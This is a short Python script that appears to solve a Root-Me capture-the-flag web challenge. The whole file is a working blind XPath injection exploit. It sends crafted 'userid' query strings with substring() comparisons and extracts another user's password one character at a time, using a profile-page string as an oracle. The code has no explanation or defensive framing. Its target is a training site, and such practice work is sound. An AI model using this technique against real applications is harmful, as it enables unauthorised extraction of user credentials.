import requests
from bs4 import BeautifulSoup as bs


url_digit = "http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid=2%20and%20substring(//user[userid=2]/password,{},1)={}"
url_letter = "http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid=2%20and%20substring(//user[userid=2]/password,{},1)=substring(//user[userid={}]/account,{},1)" # use username, email and account fields

triger = "John's profile" # not equal

for position_pswd in range(14):
	for digit in range(10):
		r = requests.get(url_digit.format(position_pswd,digit))
		soap = bs(r.content,"html.parser").get_text()
		if soap.find(triger)!=-1:
			print("Pass position= "+str(position_pswd) + " number= " + str(digit))
			break

for position_pswd in range(14):
	for user in range(6):
		for position_usname in range(7): # change for email and account
			r = requests.get(url_letter.format(position_pswd,user,position_usname))
			soap = bs(r.content,"html.parser").get_text()
			if soap.find(triger)!=-1:
				print("Pass position= "+str(position_pswd) + " username number= " + str(user) +" position in username= " + str(position_usname))
				break